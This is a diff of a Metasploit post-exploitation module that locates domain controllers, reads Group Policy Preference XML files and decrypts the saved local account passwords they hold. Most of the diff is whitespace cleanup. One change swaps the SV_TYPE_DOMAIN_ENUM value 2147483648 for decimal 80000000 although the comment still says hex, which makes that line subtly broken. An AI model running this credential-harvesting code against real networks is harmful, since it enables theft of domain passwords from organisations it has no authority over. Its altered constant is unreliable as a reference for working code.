@@ -18,14 +18,14 @@ class Metasploit3 < Msf::Post
 			'Name'          => 'Windows Gather Group Policy Preferences Saved Password Extraction',
 			'Description'   => %q{
 				This module enumerates the victim machine's domain controller and
-				connects to it via SMB. It then looks for Group Policy Preference XML 
-				files containing local user accounts and passwords. It then parses the 
+				connects to it via SMB. It then looks for Group Policy Preference XML
+				files containing local user accounts and passwords. It then parses the
 				XML files and decrypts the passwords.
-				
+
 				Users can specify DOMAINS="domain1 domain2 domain3 etc" to target specific
 				domains on the network. This module will enumerate any domain controllers for
 				those domains.
-				
+
 				Users can specify ALL=True to target all domains and their domain controllers
 				on the network.
 
@@ -40,14 +40,14 @@ class Metasploit3 < Msf::Post
 				'Rob Fuller <mubix[at]hak5.org>', #domain/dc enumeration code
 				'Joshua Abraham <jabra[at]rapid7.com>' #enum_domain.rb code
 				],
-			'References'    => 
+			'References'    =>
 				[
 					['URL', 'http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences']
 				],
 			'Platform'      => [ 'windows' ],
 			'SessionTypes'  => [ 'meterpreter' ]
 		))
-		
+
 		register_options(
 			[
 				OptBool.new('CURRENT', [ false, 'Enumerate current machine domain.', true]),
@@ -64,11 +64,11 @@ class Metasploit3 < Msf::Post
 
 		dcs = []
 		paths = []
-		
+
 		if !datastore['DOMAINS'].to_s.empty?
 			user_domains = datastore['DOMAINS'].to_s.split(' ')
 			print_status "User supplied domains #{user_domains}"
-			
+
 			user_domains.each do |domain_name|
 				found_dcs = enum_dcs(domain_name)
 				dcs << found_dcs[0] unless found_dcs.to_a.empty?
@@ -80,8 +80,8 @@ class Metasploit3 < Msf::Post
 					print_status "Skipping '#{domain_name}'..."
 					next
 				end
-				
-				found_dcs = enum_dcs(domain_name) 
+
+				found_dcs = enum_dcs(domain_name)
 				# We only wish to enumerate one DC for each Domain.
 				dcs << found_dcs[0] unless found_dcs.to_a.empty?
 			end
@@ -90,7 +90,7 @@ class Metasploit3 < Msf::Post
 		else
 			print_error "Invalid Arguments, please supply one of CURRENT, ALL or DOMAINS arguments"
 			return nil
-		end	
+		end
 
 		dcs = dcs.flatten.compact
 		dcs.each do |dc|
@@ -121,7 +121,7 @@ class Metasploit3 < Msf::Post
 					tpath2 = "#{tpath}#{sub2}\\MACHINE\\Preferences\\Groups\\Groups.xml"
 					begin
 						paths << tpath2 if client.fs.file.stat(tpath2)
-					rescue 
+					rescue
 						next
 					end
 				end
@@ -129,7 +129,7 @@ class Metasploit3 < Msf::Post
 		rescue Rex::Post::Meterpreter::RequestError => e
 			print_error "Received error code #{e.code} when reading #{path}"
 		end
-		
+
 		return paths
 	end
 
@@ -139,8 +139,8 @@ class Metasploit3 < Msf::Post
 			until groups.eof
 				data = groups.read
 			end
-			
-			domain = path.split('\\')[2] 
+
+			domain = path.split('\\')[2]
 			return data, domain
 		rescue
 			print_status("The file #{path} either could not be read or does not exist")
@@ -155,18 +155,18 @@ class Metasploit3 < Msf::Post
 			user = node.attributes['userName']
 			newname = node.attributes['newName']
 			disabled = node.attributes['acctDisabled']
-			
+
 			# Check if policy also specifies the user is renamed.
 			if !newname.to_s.empty?
 				user = newname
 			end
-			
+
 			pass = decrypt(epassword)
-			
+
 			# UNICODE conversion
 			pass = pass.unpack('v*').pack('C*')
 			print_good("DOMAIN CONTROLLER: #{domain_controller} USER: #{user} PASS: #{pass} DISABLED: #{disabled}")
-			
+
 			if session.db_record
 				source_id = session.db_record.id
 			else
@@ -200,14 +200,13 @@ class Metasploit3 < Msf::Post
 
 	def enum_domains
 		print_status "Enumerating Domains on the Network..."
-		domain_enum = 2147483648 # SV_TYPE_DOMAIN_ENUM =  hex 80000000
+		domain_enum = 80000000 # SV_TYPE_DOMAIN_ENUM =  hex 80000000
 		buffersize = 500
 		result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domain_enum,nil,nil)
-		
 		# Estimate new buffer size on percentage recovered.
 		percent_found = (result['entriesread'].to_f/result['totalentries'].to_f)
 		buffersize = (buffersize/percent_found).to_i
-		
+
 		while result['return'] == 234
 			buffersize = buffersize + 500
 			result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domain_enum,nil,nil)
@@ -260,10 +259,10 @@ class Metasploit3 < Msf::Post
 			print_good "DC Found: #{t[:dc_hostname]}"
 			hostnames << t[:dc_hostname]
 		end
-		
+
 		return hostnames
 	end
-	
+
 	#enum_domain.rb
 	def reg_getvaldata(key,valname)
 		value = nil
@@ -290,3 +289,4 @@ class Metasploit3 < Msf::Post
 		return domain.sub!(/\\\\/,'')
 	end
 end
+
